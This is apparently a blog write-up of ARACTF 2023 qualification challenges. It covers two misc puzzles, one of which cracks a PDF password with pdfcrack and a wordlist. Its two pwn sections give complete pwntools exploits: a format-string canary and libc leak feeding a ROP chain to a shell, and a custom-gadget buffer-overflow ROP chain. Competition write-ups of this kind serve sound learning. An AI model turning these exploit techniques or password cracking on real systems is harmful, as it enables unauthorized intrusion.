+++
title = "ARACTF 2023 Quals"
date = 2023-02-26
draft = false
categories = ["CTF Writeups"]
tags = ["aractf", "misc", "pwn", "writeup"]
summary = "CP Enjoyer's writeup for the Misc (Truth, in-sanity check) and Pwn (nasgor komplek, basreng komplek) challenges at ARACTF 2023 qualification."
+++

CP Enjoyer's writeup for ARACTF 2023 qualification — the **Misc** (Truth, in-sanity check) and **Pwn** (nasgor komplek, basreng komplek) sections only.

---

# Misc

## Truth (176 pts)

{{< admonition quote "Description" >}}
Kuronushi traveled far away from his country to learn something about himself. He never sure about his identity. Untill One day, he met a sage who gave him a book of truth. The sage said " To understand about yourself,Erase the title and find the Bigger case"

Submit the flag on this format `ARA2023{}`. Separate the sentences with `_`.

**Author:** Zangetsu#2398

**Attachments:** `Truth.pdf`
{{< /admonition >}}

### Initial analysis

We are given a `Truth.pdf` file whose password is unknown. We brute-forced the password with `pdfcrack` using the `rockyou.txt` wordlist.

{{< image src="truth-pdfcrack.png" caption="pdfcrack found the Truth.pdf password" >}}

### Getting the flag

The PDF that opened contained a fairly long story. Based on the clue given in the challenge description, we only need to take the uppercase letters except in the story's title. The following is the solver we used.

**solver.py**

```python
a = "Sumeru's story is a wild ride from the ..."
for i in a:
    if ((ord(i) >= ord('A')) and (ord(i) <= ord('Z'))):
        print(i, end="")
```

After that, we just needed to separate each word with an underscore.

> Flag: `ARA2023{SOUNDS_LIKE_FANDAGO}`

## in-sanity check (100 pts)

{{< admonition quote "Description" >}}
Even the flag for sanity check is gone?

**Author:** circlebytes#5520

**Attachments:** Google Docs link
{{< /admonition >}}

### Initial analysis

We were given a gdocs link which, after we opened it, had many people interacting in it. We immediately thought of checking the history of that gdocs.

### Getting the flag

It turned out the flag was there when the gdocs was first created.

{{< image src="insanity-gdocs.png" caption="The flag found in the Google Docs version history" >}}

> Flag: `ARA2023{w3lc0m3_4nd_h4v3_4_gr3at_ctfs}`

---

# Pwn

## nasgor komplek (496 pts)

{{< admonition quote "Description" >}}
abang Ubun nasi gorengnya memang enak tapi lebih enak lagi jika di traktir ka 0xdc9 <3 #ARA2023

**Author:** beenchilling#4944

`nc 103.152.242.116 20378`
{{< /admonition >}}

### Initial analysis

We were given a service that, when opened, has two options, namely mesen and ambil pesan.

{{< image src="nasgor-menu.png" caption="Service menu (mesen / ambil pesanan)" >}}

On the `mesen` option there is a format string vulnerability so we can leak the stack contents. So we made a script to display the stack contents from offset 1 to 100.

**leak.py**

```python
from pwn import *
p = remote('103.152.242.116', 20378)
for i in range(100):
    p.sendlineafter(b'>>>\n', b'1')
    p.sendlineafter(b'mau pesen apa masse?\n', b'%' + str(i+1).encode() + b'$llx')
    p.recvuntil(b'mau ini ')
    leak = p.recvuntil(b' ')
    print(i+1, leak.decode())
```

{{< image src="nasgor-leak1.png" caption="Stack leak (first run)" >}}
{{< image src="nasgor-leak2.png" caption="Stack leak (second run)" >}}

### Getting the flag

After running the program twice, it can be seen that at offset 11 there is a canary, and there are several addresses that have the last 3 digits close to that canary. After searching on libc.rip for the symbol `__libc_start_main_ret`, offset 17 was found to be the address of that function. Two libcs matched the requirements, so we used `libc6_2.27-3ubuntu1.5_amd64.so`. After that, we made a script to leak the canary and leak `__libc_start_main_ret` for ret2libc and ret2syscall.

**solve.py**

```python
from pwn import *
libc = ELF('libc6_2.27-3ubuntu1.5_amd64.so', checksec=False)
p = remote('103.152.242.116', 20378)
context.log_level = 'debug'
p.sendlineafter(b'>>>\n', b'1')
p.sendlineafter(b'mau pesen apa masse?\n', b'%11$llx')
p.recvuntil(b'mau ini ')
canary = p64(eval('0x' + p.recvuntilS(b' ')))
log.info(canary)
p.sendlineafter(b'>>>\n', b'1')
p.sendlineafter(b'mau pesen apa masse?\n', b'%17$llx')
p.recvuntil(b'mau ini ')
leak = eval('0x' + p.recvuntilS(b' '))
log.info(hex(leak))
libc.address += leak - 0x21c87
pop_rdi = p64(libc.address + 0x2164f)
pop_rsi = p64(libc.address + 0x23a6a)
pop_rdx = p64(libc.address + 0x1b96)
pop_rax = p64(libc.address + 0x01b500)
binsh = p64(next(libc.search(b'/bin/sh\x00')))
syscall = p64(libc.address + 0xd2625)
payload = b'a'*136 + canary + b'b'*8 + pop_rdi + binsh + pop_rsi + p64(0) + pop_rdx + p64(0) + pop_rax + p64(0x3b) + syscall
p.sendlineafter(b'>>>\n', b'2')
p.sendlineafter(b'atau saran?\n', payload)
p.interactive()
```

After running that program, we got a shell and the flag.

{{< image src="nasgor-flag.png" caption="Got a shell and the flag" >}}

> Flag: `ARA2023{masak_ga_liat_tapi_enak_m3m4ng_0P_orz}`

## basreng komplek (460 pts)

{{< admonition quote "Description" >}}
aku suka basreng. apalagi kalau di bawain dari bogor sama ka Aseng. #ARA2023

**Author:** beenchilling#4944

**Attachments:** `basreng_komplek_parti.zip`, `vuln`

`nc 103.152.242.116 20371`
{{< /admonition >}}

### Initial analysis

We were given a service that, when opened, asks for input. We were also given a `vuln` binary that has functions `a` through `h`. There is a buffer overflow vulnerability and RIP is at offset 72. Using the gadgets provided in functions `a` through `h`, we can get a shell.

### Getting the flag

**solve.py**

```python
from pwn import *
exe = './vuln'
elf = ELF(exe, checksec=False)
p = remote('103.152.242.116', 20371)
#p = process(exe)
context.log_level = 'debug'
cmd = """
bp 0x401192
bp 0x40119d
c
"""
#gdb.attach(p, cmd)
bss = p64(0x404040)
gadget = p64(0x401126) # mov qword [rdi], rsi
pop_rdi = p64(0x4011fb)
pop_rsi_r15 = p64(0x4011f9)
mov_rax_0x40 = p64(0x40114d)
sub_rax_0x6 = p64(0x40115b)
add_rax_0x1 = p64(0x401166)
syscall = p64(0x401130)
payload = b'a'*72 + pop_rdi + bss + pop_rsi_r15 + b'/bin/sh\x00' + p64(0) + gadget + p64(0) + pop_rsi_r15 + p64(0)*2 + mov_rax_0x40 + p64(0) + sub_rax_0x6 + p64(0) + add_rax_0x1 + p64(0) + syscall
p.sendline(payload)
p.interactive()
```

{{< image src="basreng-flag.png" caption="Got a shell and the flag" >}}

> Flag: `ARA2023{CUST0M_ROP_D3f4ult_b4sr3ng}`
